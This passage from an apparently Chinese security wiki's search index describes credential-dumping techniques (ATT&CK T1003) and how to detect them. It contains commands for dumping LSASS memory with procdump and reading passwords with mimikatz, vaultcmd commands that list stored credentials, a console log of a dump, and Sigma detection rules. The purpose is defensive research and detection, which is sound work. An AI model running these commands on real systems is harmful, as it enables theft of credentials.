\u4e3a\u907f\u514d\u5c06\u7279\u6743\u5bc6\u7801\u8be6\u7ec6\u4fe1\u606f\u5b58\u50a8\u5728\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u7834\u574f\u5b83\u4eec\u7684\u4f4d\u7f6e\uff0c\u5e94\u4f7f\u7528\u5206\u5c42\u7684\u767b\u5f55\u534f\u8bae\u6765\u9632\u6b62\u7279\u6743\u5e10\u6237\u767b\u5f55\u5230\u53ef\u4ee5\u4ece\u5185\u5b58\u4e2d\u8f6c\u50a8\u5176\u5bc6\u7801\u54c8\u5e0c\u503c\u5e76\u7528\u4e8e\u83b7\u53d6\u6267\u884c\u5bc6\u7801\u6240\u9700\u6743\u9650\u7684\u670d\u52a1\u5668\u548c\u5de5\u4f5c\u7ad9\u3002","title":"\u7f13\u89e3\u63aa\u65bd\u53ca\u4e34\u65f6\u6027\u89e3\u51b3\u65b9\u6848"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_9","text":"MITRE-ATT&CK-T1003-006 https://attack.mitre.org/techniques/T1003/006 \u4ec0\u4e48\u662fDCSYNC\uff1f\u4e00\u4e2a\u4ecb\u7ecd https://blog.stealthbits.com/what-is-dcsync/ \u57df\u6e17\u900f\u2014\u2014DCSync https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync/ DCsync\u5229\u7528\u539f\u7406 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47 powershell\u5de5\u5177\u5b9e\u73b0 https://gist.github.com/monoxgas/9d238accd969550136db DCsysnc\u68c0\u6d4b https://yojimbosecurity.ninja/dcsync/ Active Directory\u590d\u5236 https://github.com/hunters-forge/ThreatHunter-Playbook/blob/master/library/active_directory_replication.md","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/","text":"T1003-windows-Procdump\u660e\u6587\u51ed\u8bc1 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u51ed\u8bc1\u83b7\u53d6\u662f\u4ece\u64cd\u4f5c\u7cfb\u7edf\u548c\u8f6f\u4ef6\u4e2d\u83b7\u53d6\u767b\u5f55\u4fe1\u606f\u548c\u5bc6\u7801\u7684\u8fc7\u7a0b\uff0c\u901a\u5e38\u4e3aHASH\u6563\u5217\u6216\u660e\u6587\u5bc6\u7801\u3002\u7136\u540e\u4f7f\u7528\u51ed\u8bc1\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u8bbf\u95ee\u5176\u4ed6\u7cfb\u7edf\u3002 \u7528\u6237\u767b\u5f55\u7cfb\u7edf\u540e\uff0c\u4f1a\u751f\u6210\u5404\u79cd\u51ed\u636e\u5e76\u5c06\u5176\u5b58\u50a8\u5728\u5185\u5b58\u4e2d\u7684\u672c\u5730\u5b89\u5168\u673a\u6784\u5b50\u7cfb\u7edf\u670d\u52a1\uff08LSASS\uff09\u8fdb\u7a0b\u4e2d\u3002\u8fd9\u4e9b\u51ed\u8bc1\u53ef\u4ee5\u7531\u7ba1\u7406\u7528\u6237\u6216SYSTEM\u8fdb\u884c\u7ba1\u7406\u3002 SSPI\u662fSecurity Support Provider Interface\uff08Microsoft\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u5668\u63a5\u53e3\uff09\u7684\u82f1\u6587\u7f29\u5199\u3002\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\u63a5\u53e3\uff08SSPI\uff09\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u8ba1\u7b97\u673a\u6216\u7f51\u7edc\u4e0a\u53ef\u7528\u7684\u5404\u79cd\u5b89\u5168\u6a21\u578b\uff0c\u800c\u65e0\u9700\u66f4\u6539\u5b89\u5168\u7cfb\u7edf\u7684\u63a5\u53e3\u3002SSPI\u4e0d\u4f1a\u8bb0\u5f55\u767b\u5f55\u51ed\u636e\uff0c\u56e0\u4e3a\u8fd9\u901a\u5e38\u662f\u64cd\u4f5c\u7cfb\u7edf\u5904\u7406\u7684\u7279\u6743\u64cd\u4f5c\u3002 \u4e00\u4e2a\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u5546\uff08SSP\uff09\u5305\u542b\u5728\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u901a\u8fc7\u4f7f\u4e00\u4e2a\u6216\u591a\u4e2a\u5b9e\u73b0SSPI\uff08DLL\uff09\u5b89\u5168\u5305\u63d0\u4f9b\u7ed9\u5e94\u7528\u7a0b\u5e8f\u3002\u6bcf\u4e2a\u5b89\u5168\u5305\u90fd\u63d0\u4f9b\u5e94\u7528\u7a0b\u5e8f\u7684SSPI\u51fd\u6570\u8c03\u7528\u548c\u5b9e\u9645\u5b89\u5168\u6a21\u578b\u7684\u529f\u80fd\u4e4b\u95f4\u7684\u6620\u5c04\u3002 \u4ee5\u4e0bSSP\u53ef\u7528\u4e8e\u83b7\u53d6\u51ed\u8bc1\uff1a Msv\uff1a\u4ea4\u4e92\u5f0f\u767b\u5f55\uff0c\u6279\u91cf\u767b\u5f55\u548c\u670d\u52a1\u767b\u5f55\u901a\u8fc7MSV\u8eab\u4efd\u9a8c\u8bc1\u5305\u5b8c\u6210\uff1b Wdigest\uff1a\u6458\u8981\u8ba4\u8bc1\u534f\u8bae\u8bbe\u8ba1\u7528\u4e8e\u8d85\u6587\u672c\u4f20\u8f93\u534f\u8bae\uff08HTTP\uff09\u548c\u7b80\u5355\u8ba4\u8bc1\u5b89\u5168\u5c42\uff08SASL\uff09\u4ea4\u6362\uff1b Kerberos\uff1aKerberos V5\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\u63d0\u4f9b\u4e00\u4e2a\u5728\u5ba2\u6237\u7aef\u8ddf\u670d\u52a1\u5668\u7aef\u4e4b\u95f4\u6216\u8005\u670d\u52a1\u5668\u4e0e\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236 \uff08\u5e76\u4e14\u662f\u76f8\u4e92\u7684\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\uff09\uff1b CredSSP\uff1a\u4e3a\u8fdc\u7a0b\u684c\u9762\u670d\u52a1\u63d0\u4f9bSSO\u548c\u7f51\u7edc\u7ea7\u522b\u8eab\u4efd\u9a8c\u8bc1\uff1b \u6d4b\u8bd5\u6848\u4f8b \u4ee5\u4e0b\u5de5\u5177\u53ef\u7528\u4e8e\u679a\u4e3e\u51ed\u636e\uff1a Windows\u51ed\u636e\u7f16\u8f91\u5668 Mimikatz \u9664\u4e86\u5185\u5b58\u6280\u672f\uff0cLSASS\u8fdb\u7a0b\u5185\u5b58\u53ef\u4ee5\u4ece\u76ee\u6807\u4e3b\u673a\u8f6c\u50a8\u5e76\u5728\u672c\u5730\u7cfb\u7edf\u4e0a\u8fdb\u884c\u5206\u6790\u3002 \u4f8b\u5982\uff0c\u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u4f7f\u7528procdump\uff1a procdump -ma lsass.exe lsass_dump \u5728\u672c\u5730\uff0c\u8fd0\u884cmimikatz\uff1a sekurlsa::Minidump lsassdump.dmp sekurlsa::logonPasswords \u68c0\u6d4b\u65e5\u5fd7 sysmon\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u573a\u666f\uff1a\u653b\u51fb\u8005\u5229\u7528Procdump\u83b7\u53d6lsass\u8fdb\u7a0b\u5185\u5b58\u6587\u4ef6\uff0c\u672c\u5730\u4f7f\u7528mimikatz\u83b7\u53d6\u5bc6\u7801(administrator)\u3002 Microsoft Windows [\u7248\u672c 6.1.7601] \u7248\u6743\u6240\u6709 (c) 2009 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 C:\\Users\\Administrator>cd C:\\Users\\Administrator\\Desktop\\Procdump C:\\Users\\Administrator\\Desktop\\Procdump>procdump64.exe -ma lsass.exe 1.dmp ProcDump v8.0 - Writes process dump files Copyright (C) 2009-2016 Mark Russinovich Sysinternals - www.sysinternals.com With contributions from Andrew Richards [13:42:47] Dump 1 initiated: C:\\Users\\Administrator\\Desktop\\Procdump\\1.dmp [13:42:50] Dump 1 writing: Estimated dump file size is 50 MB. [13:42:51] Dump 1 complete: 50 MB written in 3.3 seconds [13:42:51] Dump count reached. C:\\Users\\Administrator\\Desktop\\Procdump> \u6d4b\u8bd5\u7559\u75d5 sysmon\u4e8b\u4ef6\uff0c\u8fdb\u7a0b\u521b\u5efa\u3001\u8fdb\u7a0b\u8bbf\u95ee\u3001\u8fdb\u7a0b\u7ed3\u675f \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u660e\u6587\u83b7\u53d6\u51ed\u8bc1\u2014\u2014Procdump description: windows server 2008 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c status: experimental author: 12306Bro logsource: product: windows service: sysmon detection: selection: OriginalFileName: 'procdump' filter: Image: - '*\\procdump.exe' - '*\\procdump64.exe' condition: selection and not filter falsepositives: - Procdump illegaly bundled with legitimate software - Weird admins who renamed binaries level: critical timeframe: last 1m condition: all of them \u5efa\u8bae \u5efa\u8bae\u60a8\u5173\u6ce8\u4e00\u4e0bsysmon10.2\u7684\u65b0\u7279\u6027OriginalFileName\uff0c\u7ecf\u8fc7\u5b89\u5168\u4eba\u5458\u7814\u7a76\u6d4b\u8bd5\u53d1\u73b0\uff0c\u5728\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\uff0cprocdump\u4fee\u6539\u4e3aABC\uff0c\u4f46OriginalFileName\u4f9d\u65e7\u80fd\u591f\u6e05\u6670\u7684\u8bc6\u522b\u51fa\u8be5\u6b3e\u5de5\u5177\u662fprocdump\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1003 https://attack.mitre.org/techniques/T1003/ windows SSPI\u6a21\u578b https://docs.microsoft.com/zh-cn/windows/win32/secauthn/sspi-model MSV\u8eab\u4efd\u9a8c\u8bc1\u5305 https://blog.csdn.net/lionzl/article/details/7725116 Wdigest\u6458\u8981\u8ba4\u8bc1\u534f\u8bae https://www.4hou.com/info/news/8126.html Kerberos\u8eab\u4efd\u8ba4\u8bc1\u534f\u8bae\u6280\u672f\u53c2\u8003 https://www.cnblogs.com/adylee/articles/893448.html CredSSP\u51ed\u8bc1\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\u534f\u8bae https://docs.microsoft.com/zh-cn/windows/win32/secauthn/credential-security-support-provider","title":"T1003-windows-Procdump\u660e\u6587\u51ed\u8bc1"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#t1003-windows-procdump","text":"","title":"T1003-windows-Procdump\u660e\u6587\u51ed\u8bc1"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#attck","text":"\u51ed\u8bc1\u83b7\u53d6\u662f\u4ece\u64cd\u4f5c\u7cfb\u7edf\u548c\u8f6f\u4ef6\u4e2d\u83b7\u53d6\u767b\u5f55\u4fe1\u606f\u548c\u5bc6\u7801\u7684\u8fc7\u7a0b\uff0c\u901a\u5e38\u4e3aHASH\u6563\u5217\u6216\u660e\u6587\u5bc6\u7801\u3002\u7136\u540e\u4f7f\u7528\u51ed\u8bc1\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u8bbf\u95ee\u5176\u4ed6\u7cfb\u7edf\u3002 \u7528\u6237\u767b\u5f55\u7cfb\u7edf\u540e\uff0c\u4f1a\u751f\u6210\u5404\u79cd\u51ed\u636e\u5e76\u5c06\u5176\u5b58\u50a8\u5728\u5185\u5b58\u4e2d\u7684\u672c\u5730\u5b89\u5168\u673a\u6784\u5b50\u7cfb\u7edf\u670d\u52a1\uff08LSASS\uff09\u8fdb\u7a0b\u4e2d\u3002\u8fd9\u4e9b\u51ed\u8bc1\u53ef\u4ee5\u7531\u7ba1\u7406\u7528\u6237\u6216SYSTEM\u8fdb\u884c\u7ba1\u7406\u3002 SSPI\u662fSecurity Support Provider Interface\uff08Microsoft\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u5668\u63a5\u53e3\uff09\u7684\u82f1\u6587\u7f29\u5199\u3002\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\u63a5\u53e3\uff08SSPI\uff09\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u8ba1\u7b97\u673a\u6216\u7f51\u7edc\u4e0a\u53ef\u7528\u7684\u5404\u79cd\u5b89\u5168\u6a21\u578b\uff0c\u800c\u65e0\u9700\u66f4\u6539\u5b89\u5168\u7cfb\u7edf\u7684\u63a5\u53e3\u3002SSPI\u4e0d\u4f1a\u8bb0\u5f55\u767b\u5f55\u51ed\u636e\uff0c\u56e0\u4e3a\u8fd9\u901a\u5e38\u662f\u64cd\u4f5c\u7cfb\u7edf\u5904\u7406\u7684\u7279\u6743\u64cd\u4f5c\u3002 \u4e00\u4e2a\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u5546\uff08SSP\uff09\u5305\u542b\u5728\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u901a\u8fc7\u4f7f\u4e00\u4e2a\u6216\u591a\u4e2a\u5b9e\u73b0SSPI\uff08DLL\uff09\u5b89\u5168\u5305\u63d0\u4f9b\u7ed9\u5e94\u7528\u7a0b\u5e8f\u3002\u6bcf\u4e2a\u5b89\u5168\u5305\u90fd\u63d0\u4f9b\u5e94\u7528\u7a0b\u5e8f\u7684SSPI\u51fd\u6570\u8c03\u7528\u548c\u5b9e\u9645\u5b89\u5168\u6a21\u578b\u7684\u529f\u80fd\u4e4b\u95f4\u7684\u6620\u5c04\u3002 \u4ee5\u4e0bSSP\u53ef\u7528\u4e8e\u83b7\u53d6\u51ed\u8bc1\uff1a Msv\uff1a\u4ea4\u4e92\u5f0f\u767b\u5f55\uff0c\u6279\u91cf\u767b\u5f55\u548c\u670d\u52a1\u767b\u5f55\u901a\u8fc7MSV\u8eab\u4efd\u9a8c\u8bc1\u5305\u5b8c\u6210\uff1b Wdigest\uff1a\u6458\u8981\u8ba4\u8bc1\u534f\u8bae\u8bbe\u8ba1\u7528\u4e8e\u8d85\u6587\u672c\u4f20\u8f93\u534f\u8bae\uff08HTTP\uff09\u548c\u7b80\u5355\u8ba4\u8bc1\u5b89\u5168\u5c42\uff08SASL\uff09\u4ea4\u6362\uff1b Kerberos\uff1aKerberos V5\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\u63d0\u4f9b\u4e00\u4e2a\u5728\u5ba2\u6237\u7aef\u8ddf\u670d\u52a1\u5668\u7aef\u4e4b\u95f4\u6216\u8005\u670d\u52a1\u5668\u4e0e\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236 \uff08\u5e76\u4e14\u662f\u76f8\u4e92\u7684\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\uff09\uff1b CredSSP\uff1a\u4e3a\u8fdc\u7a0b\u684c\u9762\u670d\u52a1\u63d0\u4f9bSSO\u548c\u7f51\u7edc\u7ea7\u522b\u8eab\u4efd\u9a8c\u8bc1\uff1b","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_1","text":"\u4ee5\u4e0b\u5de5\u5177\u53ef\u7528\u4e8e\u679a\u4e3e\u51ed\u636e\uff1a Windows\u51ed\u636e\u7f16\u8f91\u5668 Mimikatz \u9664\u4e86\u5185\u5b58\u6280\u672f\uff0cLSASS\u8fdb\u7a0b\u5185\u5b58\u53ef\u4ee5\u4ece\u76ee\u6807\u4e3b\u673a\u8f6c\u50a8\u5e76\u5728\u672c\u5730\u7cfb\u7edf\u4e0a\u8fdb\u884c\u5206\u6790\u3002 \u4f8b\u5982\uff0c\u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u4f7f\u7528procdump\uff1a procdump -ma lsass.exe lsass_dump \u5728\u672c\u5730\uff0c\u8fd0\u884cmimikatz\uff1a sekurlsa::Minidump lsassdump.dmp sekurlsa::logonPasswords","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_2","text":"sysmon\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_3","text":"\u573a\u666f\uff1a\u653b\u51fb\u8005\u5229\u7528Procdump\u83b7\u53d6lsass\u8fdb\u7a0b\u5185\u5b58\u6587\u4ef6\uff0c\u672c\u5730\u4f7f\u7528mimikatz\u83b7\u53d6\u5bc6\u7801(administrator)\u3002 Microsoft Windows [\u7248\u672c 6.1.7601] \u7248\u6743\u6240\u6709 (c) 2009 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 C:\\Users\\Administrator>cd C:\\Users\\Administrator\\Desktop\\Procdump C:\\Users\\Administrator\\Desktop\\Procdump>procdump64.exe -ma lsass.exe 1.dmp ProcDump v8.0 - Writes process dump files Copyright (C) 2009-2016 Mark Russinovich Sysinternals - www.sysinternals.com With contributions from Andrew Richards [13:42:47] Dump 1 initiated: C:\\Users\\Administrator\\Desktop\\Procdump\\1.dmp [13:42:50] Dump 1 writing: Estimated dump file size is 50 MB. [13:42:51] Dump 1 complete: 50 MB written in 3.3 seconds [13:42:51] Dump count reached. C:\\Users\\Administrator\\Desktop\\Procdump>","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_4","text":"sysmon\u4e8b\u4ef6\uff0c\u8fdb\u7a0b\u521b\u5efa\u3001\u8fdb\u7a0b\u8bbf\u95ee\u3001\u8fdb\u7a0b\u7ed3\u675f","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#sigma","text":"title: \u660e\u6587\u83b7\u53d6\u51ed\u8bc1\u2014\u2014Procdump description: windows server 2008 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c status: experimental author: 12306Bro logsource: product: windows service: sysmon detection: selection: OriginalFileName: 'procdump' filter: Image: - '*\\procdump.exe' - '*\\procdump64.exe' condition: selection and not filter falsepositives: - Procdump illegaly bundled with legitimate software - Weird admins who renamed binaries level: critical timeframe: last 1m condition: all of them","title":"sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_6","text":"\u5efa\u8bae\u60a8\u5173\u6ce8\u4e00\u4e0bsysmon10.2\u7684\u65b0\u7279\u6027OriginalFileName\uff0c\u7ecf\u8fc7\u5b89\u5168\u4eba\u5458\u7814\u7a76\u6d4b\u8bd5\u53d1\u73b0\uff0c\u5728\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\uff0cprocdump\u4fee\u6539\u4e3aABC\uff0c\u4f46OriginalFileName\u4f9d\u65e7\u80fd\u591f\u6e05\u6670\u7684\u8bc6\u522b\u51fa\u8be5\u6b3e\u5de5\u5177\u662fprocdump\u3002","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_7","text":"MITRE-ATT&CK-T1003 https://attack.mitre.org/techniques/T1003/ windows SSPI\u6a21\u578b https://docs.microsoft.com/zh-cn/windows/win32/secauthn/sspi-model MSV\u8eab\u4efd\u9a8c\u8bc1\u5305 https://blog.csdn.net/lionzl/article/details/7725116 Wdigest\u6458\u8981\u8ba4\u8bc1\u534f\u8bae https://www.4hou.com/info/news/8126.html Kerberos\u8eab\u4efd\u8ba4\u8bc1\u534f\u8bae\u6280\u672f\u53c2\u8003 https://www.cnblogs.com/adylee/articles/893448.html CredSSP\u51ed\u8bc1\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\u534f\u8bae https://docs.microsoft.com/zh-cn/windows/win32/secauthn/credential-security-support-provider","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/","text":"T1003-win-vaultcmd\u83b7\u53d6\u7cfb\u7edf\u51ed\u636e\u57fa\u672c\u4fe1\u606f \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u51ed\u636e\u5bfc\u51fa\u662f\u4ece\u64cd\u4f5c\u7cfb\u7edf\u548c\u8f6f\u4ef6\u83b7\u53d6\u8d26\u53f7\u767b\u5f55\u540d\u548c\u5bc6\u7801\uff08\u54c8\u5e0c\u6216\u660e\u6587\u5bc6\u7801\uff09\u4fe1\u606f\u7684\u8fc7\u7a0b\u3002\u7136\u540e\u53ef\u4ee5\u4f7f\u7528\u51ed\u636e\u6765\u6267\u884c\u6a2a\u5411\u79fb\u52a8\u5e76\u8bbf\u95ee\u53d7\u9650\u5236\u7684\u4fe1\u606f\u3002 \u653b\u51fb\u8005\u548c\u4e13\u4e1a\u5b89\u5168\u6d4b\u8bd5\u4eba\u5458\u90fd\u53ef\u80fd\u4f1a\u4f7f\u7528\u6b64\u6280\u672f\u4e2d\u63d0\u5230\u7684\u51e0\u79cd\u5de5\u5177\u3002\u4e5f\u53ef\u80fd\u5b58\u5728\u5176\u4ed6\u81ea\u5b9a\u4e49\u5de5\u5177\u3002 \u6d4b\u8bd5\u6848\u4f8b \u83b7\u5f97\u7cfb\u7edf\u51ed\u636e\u7684\u57fa\u672c\u4fe1\u606f \u5de5\u51771\uff1a vaultcmd(windows\u7cfb\u7edf\u81ea\u5e26) \u5e38\u7528\u547d\u4ee4\uff1a \u5217\u51fa\u4fdd\u7ba1\u5e93(vault)\u5217\u8868\uff1a vaultcmd /list \u6ce8\uff1a\u4e0d\u540c\u7c7b\u578b\u7684\u51ed\u636e\u4fdd\u5b58\u5728\u4e0d\u540c\u7684\u4fdd\u7ba1\u5e93(vault)\u4e0b \u5217\u51fa\u4fdd\u7ba1\u5e93(vault)\u6982\u8981\uff0c\u51ed\u636e\u540d\u79f0\u548cGUID\uff1a vaultcmd /listschema \u6ce8\uff1aGUID\u5bf9\u5e94\u8def\u5f84%localappdata%/Microsoft\\Vault{GUID}\u4e0b\u7684\u6587\u4ef6 \u5217\u51fa\u540d\u4e3a\u201dWeb Credentials\u201d\u7684\u4fdd\u7ba1\u5e93(vault)\u4e0b\u7684\u6240\u6709\u51ed\u636e\u4fe1\u606f\uff1a vaultcmd /listcreds:\"Web Credentials\" \u6ce8\uff1a\u5982\u679c\u662f\u4e2d\u6587\u64cd\u4f5c\u7cfb\u7edf\uff0c\u53ef\u5c06\u540d\u79f0\u66ff\u6362\u4e3a\u5bf9\u5e94\u7684GUID\uff0c\u547d\u4ee4\u5982\u4e0b \u5217\u51faGUID\u4e3a{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}\u7684\u4fdd\u7ba1\u5e93(vault)\u4e0b\u7684\u6240\u6709\u51ed\u636e\uff1a vaultcmd /listcreds:{4BF4C442-9B8A-41A0-B380-DD4A704DDB28} \u5217\u51faGUID\u4e3a{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}\u7684\u4fdd\u7ba1\u5e93(vault)\u7684\u5c5e\u6027\uff0c\u5305\u62ec\u6587\u4ef6\u4f4d\u7f6e\u3001\u5305\u542b\u7684\u51ed\u636e\u6570\u91cf\u3001\u4fdd\u62a4\u65b9\u6cd5\uff1a vaultcmd /listproperties:{4BF4C442-9B8A-41A0-B380-DD4A704DDB28} \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 windows Sysmon\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u81ea\u884c\u6d4b\u8bd5\u5373\u53ef\uff0c\u7565\u7b80\u5355 \u6d4b\u8bd5\u7559\u75d5 windows\u5b89\u5168\u65e5\u5fd7\u4e0b\u8f7d\u5730\u5740\uff1a \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: win-vaultcmd\u83b7\u53d6\u7cfb\u7edf\u51ed\u636e\u57fa\u672c\u4fe1\u606f description: windows server 2016 tags: T1003 status: experimental author: 12306Bro logsource: product: windows service: security/Sysmon detection: selection: EventID: - 4688 #windows\u5b89\u5168\u65e5\u5fd7\uff0c\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 - 1 #windows Sysmon\u65e5\u5fd7\uff0c\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b New processname: C:\\Windows\\System32\\VaultCmd.exe #\u65b0\u8fdb\u7a0b\u540d\u79f0/image Parent processname: C:\\Windows\\System32\\cmd.exe #\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0/ParentImage Process commandline: - vaultcmd /list #\u5217\u51fa\u4fdd\u7ba1\u5e93(vault)\u5217\u8868 - vaultcmd /listschema #\u5217\u51fa\u4fdd\u7ba1\u5e93(vault)\u6982\u8981\uff0c\u51ed\u636e\u540d\u79f0\u548cGUID - vaultcmd /listcreds:{*} #\u4e2d\u6587\u7cfb\u7edf\uff0c\u5217\u51faGUID\u4e3a{* }\u7684\u4fdd\u7ba1\u5e93(vault)\u4e0b\u7684\u6240\u6709\u51ed\u636e - vaultcmd /listcreds:\"*\" #\u82f1\u6587\u7cfb\u7edf \uff0c\u5217\u51fa\u540d\u4e3a\u201d*\u201d\u7684\u4fdd\u7ba1\u5e93(vault)\u4e0b\u7684\u6240\u6709\u51ed\u636e\u4fe1\u606f - vaultcmd /listproperties:{*} #\u4e2d\u6587\u7cfb\u7edf\uff0c\u5217\u51faGUID\u4e3a{*}\u7684\u4fdd\u7ba1\u5e93(vault)\u7684\u5c5e\u6027\uff0c\u5305\u62ec\u6587\u4ef6\u4f4d\u7f6e\u3001\u5305\u542b\u7684\u51ed\u636e\u6570\u91cf\u3001\u4fdd\u62a4\u65b9\u6cd5 condition: selection \u5efa\u8bae \u6ce8\uff1a\u5728\u4f4e\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4f7f\u7528windows \u5b89\u5168\u65e5\u5fd74688\uff0c\u8fdb\u7a0bVaultCmd.exe\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\uff1b\u4e5f\u53ef\u4f7f\u7528Sysmon\u8fdb\u884c\u884c\u4e3a\u8bb0\u5f55\uff0c\u5206\u6790\u68c0\u6d4b\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1003 https://attack.mitre.org/techniques/T1003/ \u6e17\u900f\u6280\u5de7\u2014\u2014Windows\u4e2dCredential Manager\u7684\u4fe1\u606f\u83b7\u53d6 https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%ADCredential-Manager%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96/","title":"T1003-win-vaultcmd\u83b7\u53d6\u7cfb\u7edf\u51ed\u636e\u57fa\u672c\u4fe1\u606f"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/#t1003-win-vaultcmd","text":"","title":"T1003-win-vaultcmd\u83b7\u53d6\u7cfb\u7edf\u51ed\u636e\u57fa\u672c\u4fe1\u606f"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/#attck","text":"\u51ed\u636e\u5bfc\u51fa\u662f\u4ece\u64cd\u4f5c\u7cfb\u7edf\u548c\u8f6f\u4ef6\u83b7\u53d6\u8d26\u53f7\u767b\u5f55\u540d\u548c\u5bc6\u7801\uff08\u54c8\u5e0c\u6216\u660e\u6587\u5bc6\u7801